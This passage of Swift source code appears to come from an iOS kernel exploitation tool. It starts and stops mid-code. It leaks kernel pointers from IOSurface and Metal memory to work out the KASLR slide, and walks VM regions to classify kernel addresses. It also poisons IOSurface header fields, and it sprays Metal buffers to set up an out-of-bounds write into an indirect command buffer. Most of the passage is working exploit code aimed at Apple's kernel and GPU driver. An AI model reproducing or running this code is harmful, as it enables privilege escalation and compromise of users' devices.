                        if sOff >= anc { let s = sOff &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { slideNote = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(0xfffffff007004000 &+ s,radix:16))"; break } }
                    }
                    step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [PAC-KTEXT sOff=0x\(String(sOff,radix:16))]\(slideNote)")
                    seenThisRun.insert(v)
                    continue
                }
                let cat: String
                if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                    cat = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
                }
                else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
                else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
                else                                                    { cat = "KGAP"  }
                step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
                // Only track KHEAP and KTEXT offsets — KMMIO values are Metal GPU ring-buffer
                // addresses that change between boots by page-aligned amounts, producing false
                // positives in the KASLR slide check. KGAP values are not kernel pointers either.
                if cat == "KHEAP" || cat == "KTEXT" || cat == "KTEXTD" {
                    currentPairs.append((offset: globalOff, val: v))
                }
                seenThisRun.insert(v)
            }
        }
        if prtAnyRead {
            step("  post_relock_tail total: \(currentPairs.count) vals (after sentinel filter)")

            // Frequency tracking: count how many runs each value has appeared in
            for v in seenThisRun { _iosurfValFreq[v, default: 0] += 1 }

            // Print top recurring values (appear in 2+ runs)
            let recurring = _iosurfValFreq.filter { $0.value >= 2 }.sorted { $0.value > $1.value }
            if !recurring.isEmpty {
                step("RECURRING (\(_iosurfRunCount) runs total):")
                for (v, cnt) in recurring.prefix(20) {
                    let vLo48r = v & 0x0000FFFFFFFFFFFF
                    let isPacr = v < 0xFFFFFE0000000000 && vLo48r >= 0x0000fff007004000 && vLo48r <= 0x0000fff08a744000
                    let cat: String
                    if isPacr                                              { cat = "PAC-KTEXT" }
                    else if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                        cat = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
                    }
                    else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
                    else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
                    else                                                    { cat = "KGAP"  }
                    let unslidBase: UInt64 = 0xFFFFFFF007004000
                    var extra = ""
                    if isPacr {
                        let sOff = vLo48r &- 0x0000fff007004000
                        let anchors3: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
                                                  0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
                                                  0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
                        for anc in anchors3 {
                            if sOff >= anc { let s = sOff &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { extra = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(unslidBase &+ s,radix:16))"; break } }
                        }
                        if extra.isEmpty { extra = " sOff=0x\(String(sOff,radix:16))" }
                    } else if cat == "KTEXT" {
                        let slide = v &- unslidBase
                        if slide <= 0x80000000 { extra = " *** KASLR slide=0x\(String(slide,radix:16))" }
                    } else if cat == "KTEXTD" {
                        extra = " (unaligned — data/stack residue, not a code ptr)"
                    }
                    step("  ×\(cnt) 0x\(String(v,radix:16)) [\(cat)]\(extra)")
                }
            } else {
                step("RECURRING: none yet (run \(_iosurfRunCount)) — keep tapping")
            }

            // First-time values this run — most likely actual varied kernel heap residue
            let novelVals = seenThisRun.filter { _iosurfValFreq[$0] == 1 }.sorted()
            if !novelVals.isEmpty {
                step("NOVEL THIS RUN (\(novelVals.count) first-time values — transient heap residue):")
                for v in novelVals {
                    let vLo48n = v & 0x0000FFFFFFFFFFFF
                    let isPacn = v < 0xFFFFFE0000000000 && vLo48n >= 0x0000fff007004000 && vLo48n <= 0x0000fff08a744000
                    let cat2: String
                    if isPacn                                              { cat2 = "PAC-KTEXT" }
                    else if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                        cat2 = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
                    } else if v >= 0xFFFFFFF080000000 {
                        cat2 = "KMMIO"
                    } else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF {
                        cat2 = "KHEAP"
                    } else {
                        cat2 = "KGAP"
                    }
                    let unslidBase2: UInt64 = 0xFFFFFFF007004000
                    var extra2 = ""
                    if isPacn {
                        let sOff2 = vLo48n &- 0x0000fff007004000
                        let anchors4: [UInt64] = [0x0299ac80,0x0299ad20,0x03573708,0x035736fc,0x035736cc,
                                                  0x0357369c,0x03573514,0x0299ad7c,0x035703f4,0x03573484,
                                                  0x03573454,0x035732fc,0x035c7f6c,0x035732f0,0x0299b3e4]
                        for anc in anchors4 {
                            if sOff2 >= anc { let s = sOff2 &- anc; if s % 0x4000 == 0 && s <= 0x80000000 { extra2 = " *** KASLR slide=0x\(String(s,radix:16)) __TEXT=0x\(String(unslidBase2 &+ s,radix:16))"; break } }
                        }
                        if extra2.isEmpty { extra2 = " sOff=0x\(String(sOff2,radix:16))" }
                    } else if cat2 == "KTEXT" {
                        let slide2 = v &- unslidBase2
                        if slide2 <= 0x80000000 { extra2 = " *** KASLR slide=0x\(String(slide2,radix:16))" }
                    }
                    step("  ★ 0x\(String(v,radix:16)) [\(cat2)]\(extra2)")
                }
            }

            // Accumulate KHEAP values into this-boot set
            for pair in currentPairs {
                if pair.val >= 0xFFFFFE0000000000 && pair.val <= 0xFFFFFEFFFFFFFFFF {
                    _thisBootKheap.insert(pair.val)
                }
            }

            // Cross-boot delta: values in prev boot not in any run this boot yet (changed = KASLR-slid candidates)
            if !_prevBootKheap.isEmpty && _iosurfRunCount == 5 {
                let gone = _prevBootKheap.subtracting(_thisBootKheap)
                let newOnes = _thisBootKheap.subtracting(_prevBootKheap)
                if !gone.isEmpty || !newOnes.isEmpty {
                    step("CROSS-BOOT DELTA (KASLR-slid candidates):")
                    for v in gone.sorted() { step("  GONE  0x\(String(v,radix:16)) [was in prev boot]") }
                    for v in newOnes.sorted() { step("  NEW   0x\(String(v,radix:16)) [new this boot]") }
                } else {
                    step("CROSS-BOOT DELTA: all KHEAP values identical to prev boot (fixed constants)")
                }
            }

            // Per-offset slide detection: same offset, different value across boots = KASLR delta.
            // GPU command-buffer fields are at FIXED offsets; their values shift by exactly the KASLR slide.
            if !_prevBootOffsetMap.isEmpty && _iosurfRunCount == 5 {
                step("OFFSET-SLIDE CHECK (\(_prevBootOffsetMap.count) prev-boot offsets):")
                var slideHits = 0, nonAligned = 0
                for pair in currentPairs {
                    guard let pv = _prevBootOffsetMap[pair.offset], pv != pair.val else { continue }
                    let fwd = pair.val &- pv
                    let rev = pv &- pair.val
                    let d   = fwd <= rev ? fwd : rev
                    let pos = fwd <= rev
                    if d % 0x4000 == 0 && d > 0 && d <= 0x80000000 {
                        let sign: String = pos ? "+" : "-"
                        let textBase: UInt64 = 0xfffffff007004000
                        let runtimeText: UInt64 = pos ? (textBase &+ d) : (textBase &- d)
                        step("  ✓ KASLR off=0x\(String(pair.offset,radix:16)) prev=0x\(String(pv,radix:16)) curr=0x\(String(pair.val,radix:16)) Δ=\(sign)0x\(String(d,radix:16)) __TEXT≈0x\(String(runtimeText,radix:16))")
                        slideHits += 1
                    } else {
                        nonAligned += 1
                    }
                }
                step("  result: \(slideHits) slide candidates, \(nonAligned) non-aligned offset changes")
            }

            // Save snapshot only after 20+ runs so the set is stable before becoming the next boot's baseline.
            // Saving too early (e.g. run 1) evicts KASLR-slid candidates that only appeared in one early boot.
            if _iosurfRunCount >= 20 {
                var saveData = Data(count: _thisBootKheap.count * 8)
                saveData.withUnsafeMutableBytes { ptr in
                    var i = 0
                    for v in _thisBootKheap { ptr.storeBytes(of: v, toByteOffset: i*8, as: UInt64.self); i += 1 }
                }
                UserDefaults.standard.set(saveData, forKey: "kheap_prev_boot")

                // Save per-offset map for next boot's KASLR delta computation.
                var omData = Data(count: currentPairs.count * 16)
                omData.withUnsafeMutableBytes { ptr in
                    for (i, pair) in currentPairs.enumerated() {
                        ptr.storeBytes(of: UInt64(pair.offset), toByteOffset: i*16,     as: UInt64.self)
                        ptr.storeBytes(of: pair.val,             toByteOffset: i*16 + 8, as: UInt64.self)
                    }
                }
                UserDefaults.standard.set(omData, forKey: "kheap_prev_offsets")
            }

            _iosurfPrevTailValues = currentPairs
        } else {
            step("  post_relock_tail: no readable pages in 512KB range")
        }

        // Metal device KHEAP accumulation — scan device ObjC object directly for boot-variant KHEAP values.
        // Guaranteed to read Metal driver state regardless of where IOSurface allocation landed.
        // Values are added to _thisBootKheap so cross-boot delta has them even when IOSurface misses the zone.
        var mdAccumCount = 0
        for chunk in [deviceUAddr, deviceUAddr + 131072] {
            var mdBuf = [UInt8](repeating: 0, count: 131072)
            var mdOut: vm_size_t = 0
            let mdKr: kern_return_t = mdBuf.withUnsafeMutableBytes { b in
                vm_read_overwrite(mach_task_self_,
                                  vm_address_t(chunk),
                                  vm_size_t(131072),
                                  vm_address_t(bitPattern: b.baseAddress!),
                                  &mdOut)
            }
            guard mdKr == 0 else { continue }
            for qw in 0..<(Int(mdOut)/8) {
                var v: UInt64 = 0
                for b in 0..<8 { v |= UInt64(mdBuf[qw*8+b]) << (b*8) }
                guard v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF else { continue }
                let b0 = UInt8(v & 0xFF)
                guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
                guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                mdAccumCount += 1
                // Only accumulate interior pointers (non-zero low 2 bytes) — hardware register bases always
                // end in at least 4 zero hex digits (0x...0000). Real zone ptrs have random low bytes.
                if v & 0xFFFF != 0 { _thisBootKheap.insert(v) }
            }
        }
        if mdAccumCount > 0 {
            step("metal_dev_accum: \(mdAccumCount) KHEAP in device obj (\(_thisBootKheap.count) interior ptrs accumulated to set)")
        }

        _iosurfRunCount += 1

        // Scan 4: second IOSurface with DIFFERENT variant — allocator residue from freed pages
        let v2 = variants[(_iosurfRunCount + 1) % variants.count]
        let props2: [IOSurfacePropertyKey: Any] = [
            .width: v2.w, .height: v2.h, .bytesPerElement: 4, .bytesPerRow: v2.rowBytes,
            .pixelFormat: 0x42475241
        ]
        if let surf2 = IOSurface(properties: props2) {
            var seed3: UInt32 = 0
            surf2.lock(options: [], seed: &seed3)
            surf2.unlock(options: [], seed: nil)
            let base2 = UInt(bitPattern: surf2.baseAddress)
            scanAddr("reuse_alloc", base2, surf2.allocationSize)

            // Collect reuse_tail values for delta comparison across runs
            let tailLen = 65536
            var tailBuf = [UInt8](repeating: 0, count: tailLen)
            var tailOut: vm_size_t = 0
            let tailKr: kern_return_t = tailBuf.withUnsafeMutableBytes { b in
                vm_read_overwrite(mach_task_self_,
                                  vm_address_t(base2 + UInt(surf2.allocationSize)),
                                  vm_size_t(tailLen),
                                  vm_address_t(bitPattern: b.baseAddress!),
                                  &tailOut)
            }
            if tailKr == 0 {
                // reuse_tail: secondary delta (kr=1 usually, kept for completeness)
                step("  reuse_tail: \(Int(tailOut)) bytes readable")
            } else {
                step("  reuse_tail: vm_read kr=\(tailKr)")
            }
        }

        step("── IOSurface Leak complete ─────────────────")
        completion()
    }
}

// VM Region Scanner — classified pass
// Walks every readable mapped region via vm_region_64.
// Classifies each kernel-range pointer into:
//   KTEXT  0xFFFFFE00_00000000 .. 0xFFFFFE01_00000000  — kernel __TEXT / __DATA (KASLR target)
//   KHEAP  0xFFFFFE01_00000000 .. 0xFFFFFF00_00000000  — kalloc zones / kernel heap
//   KMMIO  0xFFFFFF00_00000000 ..                      — IOKit MMIO / physical aperture
// Reports stable repeated values (same ptr at 3+ offsets = object ref) and
// attempts KASLR slide estimate if any KTEXT pointers are found.
func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else {
            step("device nil"); completion(); return
        }
        _ = device.makeCommandQueue()
        step("AGX init — classified VM region scan")

        var addr: vm_address_t = 0
        var totalRegions = 0
        var hotRegions   = 0
        var cKTEXT = 0, cKHEAP = 0, cKMMIO = 0

        // Track KTEXT candidates for KASLR
        var ktextSamples: [(region: UInt, offset: Int, val: UInt64)] = []
        // Track value frequency for stable-ref detection
        var valueCounts: [UInt64: Int] = [:]

        while totalRegions < 2000 {
            var size:    vm_size_t = 0
            var info     = vm_region_extended_info_compat_t()
            var count    = mach_msg_type_number_t(12)
            var objName: mach_port_t = 0

            let kr: kern_return_t = withUnsafeMutablePointer(to: &info) { ip -> kern_return_t in
                vm_region_64(mach_task_self_, &addr, &size, 13,
                             UnsafeMutableRawPointer(ip).assumingMemoryBound(to: Int32.self),
                             &count, &objName)
            }
            guard kr == KERN_SUCCESS else { break }
            totalRegions += 1

            let readable = (info.protection & VM_PROT_READ) != 0
            let isShared = info.share_mode != 3
            let tag      = info.user_tag

            if readable && size >= 64 && size <= 32 * 1024 * 1024 {
                // Safe copy via vm_read_overwrite — kernel handles any fault in source VA,
                // returns error instead of crashing us on guard pages / lazy-mapped regions.
                var scratch = [UInt8](repeating: 0, count: Int(size))
                var outBytes: vm_size_t = 0
                let readKr: kern_return_t = scratch.withUnsafeMutableBytes { buf in
                    vm_read_overwrite(mach_task_self_, addr, vm_size_t(size),
                                      vm_address_t(bitPattern: buf.baseAddress!), &outBytes)
                }
                guard readKr == KERN_SUCCESS else { addr += size; continue }

                var rKTEXT = 0, rKHEAP = 0, rKMMIO = 0
                var headerLogged = false
                var logged = 0

                for qw in 0..<(Int(outBytes) / 8) {
                    var val: UInt64 = 0
                    for b in 0..<8 { val |= UInt64(scratch[qw*8 + b]) << (b*8) }
                    guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }

                    // Kernelcache parse confirmed iOS 26.5.2 A16 VA layout:
                    //   KTEXT  0xFFFFFFF000000000 – 0xFFFFFFF07FFFFFFF  (slid kernel code)
                    //   KHEAP  0xFFFFFE0000000000 – 0xFFFFFEFFFFFFFFFF  (kernel heap/data)
                    //   KMMIO  0xFFFFFFF080000000+                       (IOKit HW regs, fixed)
                    let lowBitsAligned = (val & 3) == 0
                    let b0v = UInt8(val & 0xFF)
                    let isFillPattern = (val == UInt64(b0v) &* 0x0101010101010101)

                    // Slide validity: realistic KASLR window on A16 is 0–1GB (0x40000000)
                    // Values with negative or oversized slide are kernel data constants, not code ptrs
                    let unslid: UInt64 = 0xFFFFFFF007004000
                    let computedSlide = val &- unslid
                    let slideValid = computedSlide <= 0x40000000

                    let cat: String
                    if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && lowBitsAligned && !isFillPattern && slideValid {
                        cat = "KTEXT"; rKTEXT += 1; cKTEXT += 1
                        if ktextSamples.count < 30 {
                            ktextSamples.append((region: UInt(addr), offset: qw*8, val: val))
                        }
                    } else if val < 0xFFFFFFF000000000 {
                        cat = "KHEAP"; rKHEAP += 1; cKHEAP += 1
                    } else {
                        cat = "KMMIO"; rKMMIO += 1; cKMMIO += 1
                    }
                    valueCounts[val, default: 0] += 1

                    if !headerLogged {
                        hotRegions += 1
                        let sh = isShared ? " SHARED" : ""
                        step("  [REGION 0x\(String(addr,radix:16)) sz=0x\(String(size,radix:16)) tag=\(tag)\(sh)]")
                        headerLogged = true
                    }

                    // Always log KTEXT; log KHEAP/KMMIO up to 20 per region
                    if cat == "KTEXT" || logged < 20 {
                        step("    +0x\(String(qw*8,radix:16)) = 0x\(String(val,radix:16)) [\(cat)]")
                        logged += 1
                    }
                }

                if headerLogged {
                    step("    ^ KTEXT=\(rKTEXT) KHEAP=\(rKHEAP) KMMIO=\(rKMMIO)")
                }
            }

            addr += size
        }

        // Global summary
        step("walked \(totalRegions) regions | \(hotRegions) hot")
        step("KTEXT=\(cKTEXT) | KHEAP=\(cKHEAP) | KMMIO=\(cKMMIO) | total=\(cKTEXT+cKHEAP+cKMMIO)")

        // Stable repeated refs (3+ occurrences = same kernel object referenced multiple times)
        let repeats = valueCounts.filter { $0.value >= 3 }.sorted { $0.value > $1.value }
        if !repeats.isEmpty {
            step("STABLE REFS (ptr seen ≥3×):")
            for (val, cnt) in repeats.prefix(8) {
                let cat = (val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000) ? "KTEXT" : (val < 0xFFFFFFF000000000 ? "KHEAP" : "KMMIO")
                step("  0x\(String(val,radix:16)) × \(cnt) [\(cat)]")
            }
        }

        // KASLR: all samples here passed slideValid, so slide is guaranteed 0–0x40000000
        if !ktextSamples.isEmpty {
            step("KASLR CANDIDATES (\(ktextSamples.count) valid KTEXT ptrs):")
            let unslidBase: UInt64 = 0xFFFFFFF007004000
            // Find dominant slide (most common value = likely the real KASLR slide)
            var slideCounts: [UInt64: Int] = [:]
            for s in ktextSamples {
                slideCounts[s.val &- unslidBase, default: 0] += 1
            }
            if let dominant = slideCounts.max(by: { $0.value < $1.value }) {
                step("  DOMINANT slide = 0x\(String(dominant.key,radix:16)) (×\(dominant.value) ptrs agree)")
                step("  → slid __TEXT = 0x\(String(unslidBase &+ dominant.key,radix:16))")
            }
            for s in ktextSamples.prefix(10) {
                let slide = s.val &- unslidBase
                step("  0x\(String(s.val,radix:16)) @ +0x\(String(s.offset,radix:16)) slide=0x\(String(slide,radix:16))")
            }
        } else {
            step("NO KTEXT ptrs found — all leaks are KHEAP/KMMIO")
            step("  KMMIO ptrs are IOKit/physical-aperture refs — need offline kernelcache anchor")
            step("  Most stable KMMIO ref:")
            if let top = repeats.first {
                step("  → 0x\(String(top.key,radix:16)) × \(top.value) (extract this for offline analysis)")
            }
        }

        step("── VM Region Scan complete ─────────────────")
        completion()
    }
}

// ── IOSurface Shared-Memory Escalation helpers ───────────────────────────────
private func iosFindU32LE(_ v: UInt32, _ buf: UnsafePointer<UInt8>, _ len: Int) -> Int? {
    guard len >= 4 else { return nil }
    let b0 = UInt8(v & 0xFF)
    let b1 = UInt8((v >> 8) & 0xFF)
    let b2 = UInt8((v >> 16) & 0xFF)
    let b3 = UInt8((v >> 24) & 0xFF)
    for i in 0 ... (len - 4) {
        if buf[i] == b0 && buf[i+1] == b1 && buf[i+2] == b2 && buf[i+3] == b3 { return i }
    }
    return nil
}

private func iosDumpHex(_ buf: UnsafePointer<UInt8>, _ len: Int,
                         emit: (String) -> Void) {
    var line = ""
    for i in 0 ..< len {
        if i % 16 == 0 {
            if !line.isEmpty { emit("  \(line)") }
            line = String(format: "+0x%04x: ", i)
        }
        line += String(format: "%02x ", buf[i])
    }
    if !line.isEmpty { emit("  \(line)") }
}

// ── IOSurface Shared-Memory Escalation ───────────────────────────────────────
func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async(execute: {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        step("── IOSurface Shared-Mem Escalation ──")

        let SURF_W:   Int    = 0x1337
        let SURF_H:   Int    = 0x0042
        let SURF_BPR: Int    = SURF_W * 4
        let SURF_FMT: UInt32 = 0x42475241

        let props: [IOSurfacePropertyKey: Any] = [
            .width:           SURF_W,
            .height:          SURF_H,
            .bytesPerRow:     SURF_BPR,
            .bytesPerElement: 4,
            .pixelFormat:     Int(SURF_FMT),
        ]
        guard let surf = IOSurface(properties: props) else {
            step("✗ IOSurface create failed"); completion(); return
        }

        var seed: UInt32 = 0
        IOSurfaceLock(surf, .readOnly, &seed)
        let surfBaseRaw = IOSurfaceGetBaseAddress(surf)
        let allocSz     = IOSurfaceGetAllocSize(surf)
        IOSurfaceUnlock(surf, .readOnly, &seed)
        guard UInt(bitPattern: surfBaseRaw) != 0 else {
            step("✗ IOSurfaceGetBaseAddress returned NULL"); completion(); return
        }

        let surfVA = UInt(bitPattern: surfBaseRaw)
        step("pixelBuf VA=0x\(String(surfVA, radix: 16)) allocSz=\(allocSz)")

        var headerStart = surfVA
        let PAGE_SZ     = 4096
        let MAX_SCAN    = 256 * 1024
        for back in stride(from: PAGE_SZ, through: MAX_SCAN, by: PAGE_SZ) {
            let testVA = surfVA &- UInt(back)
            let r = msync(UnsafeMutableRawPointer(bitPattern: testVA), PAGE_SZ, Int32(1))
            if r == -1 { break }
            headerStart = testVA
        }
        let headerOff = Int(surfVA - headerStart)
        let totalLen  = headerOff + allocSz
        step("mapping: 0x\(String(headerStart, radix: 16))  hdrOff=\(headerOff)  total=\(totalLen)")

        let basePtr = UnsafeMutableRawPointer(bitPattern: headerStart)!
                         .assumingMemoryBound(to: UInt8.self)

        let widthOff  = iosFindU32LE(UInt32(SURF_W),   basePtr, totalLen)
        let heightOff = iosFindU32LE(UInt32(SURF_H),   basePtr, totalLen)
        let bprOff    = iosFindU32LE(UInt32(SURF_BPR), basePtr, totalLen)
        let fmtOff    = iosFindU32LE(SURF_FMT,          basePtr, totalLen)

        let wStr   = widthOff  == nil ? "NOT FOUND" : "@ hdr+0x\(String(widthOff!,  radix: 16))"
        let hStr   = heightOff == nil ? "NOT FOUND" : "@ hdr+0x\(String(heightOff!, radix: 16))"
        let bprStr = bprOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(bprOff!,   radix: 16))"
        let fmtStr = fmtOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(fmtOff!,   radix: 16))"
        step("  width  : \(wStr)")
        step("  height : \(hStr)")
        step("  BPR    : \(bprStr)")
        step("  fmt    : \(fmtStr)")

        if headerOff > 0 {
            step("── header dump ──")
            iosDumpHex(UnsafePointer(basePtr), min(headerOff, 256), emit: step)
        } else {
            step("── pixelbuf dump (hdrOff=0) ──")
            let surfPtr = UnsafeMutableRawPointer(bitPattern: surfVA)!
                             .assumingMemoryBound(to: UInt8.self)
            iosDumpHex(UnsafePointer(surfPtr), min(256, allocSz), emit: step)
        }

        let POISON_BPR: UInt32 = 0x7FFFFFFF
        let POISON_DIM: UInt32 = 0x00007FFF
        var corrupted = false

        if let off = bprOff {
            UnsafeMutableRawPointer(basePtr.advanced(by: off))
                .storeBytes(of: POISON_BPR, as: UInt32.self)
            step("  poisoned BPR @ hdr+0x\(String(off, radix: 16))")
            corrupted = true
        }
        if let off = widthOff {
            UnsafeMutableRawPointer(basePtr.advanced(by: off))
                .storeBytes(of: POISON_DIM, as: UInt32.self)
            step("  poisoned W @ hdr+0x\(String(off, radix: 16))")
            corrupted = true
        }
        if let off = heightOff {
            UnsafeMutableRawPointer(basePtr.advanced(by: off))
                .storeBytes(of: POISON_DIM, as: UInt32.self)
            step("  poisoned H @ hdr+0x\(String(off, radix: 16))")
            corrupted = true
        }
        if !corrupted {
            step("  no fields found — blind poison @0..11")
            let raw = UnsafeMutableRawPointer(basePtr)
            raw.storeBytes(of: POISON_BPR, as: UInt32.self)
            raw.advanced(by: 4).storeBytes(of: POISON_DIM, as: UInt32.self)
            raw.advanced(by: 8).storeBytes(of: POISON_DIM, as: UInt32.self)
        }

        var seed2: UInt32 = 0
        let lockKR = IOSurfaceLock(surf, [], &seed2)
        step("  lock kr=\(lockKR)")
        if lockKR == 0 {
            let w2   = IOSurfaceGetWidth(surf)
            let h2   = IOSurfaceGetHeight(surf)
            let bpr2 = IOSurfaceGetBytesPerRow(surf)
            step("  post-lock: w=\(w2) h=\(h2) bpr=\(bpr2)")
            if w2 != SURF_W || h2 != SURF_H || bpr2 != SURF_BPR {
                step("  *** GEOMETRY CHANGED — kernel trusts shared mem ***")
            } else {
                step("  geometry stable — kernel ignores shared mem")
            }
            IOSurfaceUnlock(surf, [], &seed2)
        } else {
            step("  lock failed kr=\(lockKR)")
        }

        step("── IOSurface Escalation complete ──────────")
        completion()
    })
}

// ── ICB GPU-Address Corruption ────────────────────────────────────────────────
// Stage 2: Kernelcache cross-ref → ICB slot = 0x40 bytes (IOGPUFamily dominant const).
// Phase 1: Find adjacent (lo,hi) pair; dump hi[0..63] baseline; locate sentinelBuf VA.
// Phase 2: Single targeted OOB write at exact vtxBuf field offset with canary VA.
// Phase 3: Execute ICB — GPU derefs canary → controlled page fault.
func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async(execute: {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        step("── ICB Targeted vtxBuf Corruption (Stage 2) ──")
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
        guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }

        let BUF_LEN    = 4096
        let ICB_SLOT   = 64     // 0x40 — dominant struct-size const in IOGPUFamily __TEXT_EXEC (48 uses)

        // Sentinel — this VA is what the ICB slot's vtxBuf field should contain
        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ buf alloc failed"); completion(); return
        }
        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
        targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
        let sentVA = sentinelBuf.gpuAddress
        step("sentinelBuf gpuVA=0x\(String(sentVA,radix:16))")
        step("targetBuf   gpuVA=0x\(String(targetBuf.gpuAddress,radix:16))")

        // Shader
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        struct V { float4 pos [[position]]; };
        vertex V vtx(uint id [[vertex_id]], const device float4* b [[buffer(0)]]) {
            V o; o.pos = b[id]; return o; }
        fragment float4 frg(V in [[stage_in]]) { return float4(1,0,0,1); }
        """
        guard let lib = try? device.makeLibrary(source: src, options: nil),
              let vf  = lib.makeFunction(name: "vtx"),
              let ff  = lib.makeFunction(name: "frg") else {
            step("✗ shader failed"); completion(); return
        }
        let pd = MTLRenderPipelineDescriptor()
        pd.vertexFunction = vf; pd.fragmentFunction = ff
        pd.colorAttachments[0].pixelFormat = .bgra8Unorm
        guard let pso = try? device.makeRenderPipelineState(descriptor: pd) else {
            step("✗ PSO failed"); completion(); return
        }

        // ICB — storageModeShared so backing is CPU-visible
        let icbDesc = MTLIndirectCommandBufferDescriptor()
        icbDesc.commandTypes              = [.draw]
        icbDesc.inheritBuffers            = false
        icbDesc.maxVertexBufferBindCount  = 1
        icbDesc.maxFragmentBufferBindCount = 0
        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
                                                          maxCommandCount: 1,
                                                          options: .storageModeShared) else {
            step("✗ ICB alloc failed"); completion(); return
        }
        let icbResID = icb.gpuResourceID._impl
        step("ICB resID=0x\(String(icbResID,radix:16))")

        // Encode slot 0: sentinelBuf as vtxBuf[0], 1-vertex point draw
        let slot = icb.indirectRenderCommandAt(0)
        slot.setRenderPipelineState(pso)
        slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
        slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
        step("ICB slot 0 encoded: vtxBuf[0]=sentinelBuf (0x\(String(sentVA,radix:16)))")

        // ── Phase 1: Find adjacent pair + pre-spray baseline dump ─────────────────
        step("── Phase 1: adjacency spray + baseline probe ──")
        var loRef: MTLBuffer? = nil
        var hiRef: MTLBuffer? = nil
        for _ in 0..<128 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
                  let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            let lo = a.gpuAddress < b.gpuAddress ? a : b
            let hi = a.gpuAddress < b.gpuAddress ? b : a
            guard hi.gpuAddress == lo.gpuAddress &+ UInt64(BUF_LEN) else { continue }
            loRef = lo; hiRef = hi
            step("✓ adjacent pair: lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
            break
        }
        guard let lo = loRef, let hi = hiRef else {
            step("✗ spray miss after 128 pairs — no adjacent pair found")
            step("  → consider mach_vm_remap to alias ICB backing")
            completion(); return
        }

        // Baseline dump: hi[0..63] — looking for ICB slot 0 data
        let q = hi.contents().assumingMemoryBound(to: UInt8.self)
        step("── hi[0..63] baseline (pre-spray, ICB slot size=0x\(String(ICB_SLOT,radix:16))) ──")
        for row in 0..<4 {
            let base = row * 16
            var hexStr = ""
            var ascStr = ""
            for i in 0..<16 {
                let b = q[base + i]
                hexStr += String(format: "%02x ", b)
                ascStr += (b >= 0x20 && b < 0x7f) ? String(UnicodeScalar(b)) : "."
            }
            step("  [+0x\(String(format: "%02x", base))]: \(hexStr) |\(ascStr)|")
        }

        // Search hi[0..ICB_SLOT-1] for sentinelBuf GPU VA (LE 8-byte)
        var vtxBufOff: Int? = nil
        for off in 0...(ICB_SLOT - 8) {
            var hit = true
            for bi in 0..<8 {
                if q[off + bi] != UInt8((sentVA >> (bi * 8)) & 0xFF) { hit = false; break }
            }
            if hit { vtxBufOff = off; break }
        }
        // Extended: search full 4096 bytes if slot-range missed
        if vtxBufOff == nil {
            step("  sentinel not in slot[0..63] — scanning full hi (4096 bytes)")
            for off in 0...(BUF_LEN - 8) {
                var hit = true
                for bi in 0..<8 {
                    if q[off + bi] != UInt8((sentVA >> (bi * 8)) & 0xFF) { hit = false; break }
                }
                if hit { vtxBufOff = off; break }
            }
        }

        if let voff = vtxBufOff {
            step("✓ sentinelBuf VA @ hi[+0x\(String(format:"%x",voff))] → vtxBuf field offset confirmed")
        } else {
            step("✗ sentinelBuf VA not found in hi — ICB backing may not be adjacent")
            step("  will flood full hi as fallback")
        }

        // ── Phase 2: Targeted OOB write ───────────────────────────────────────────
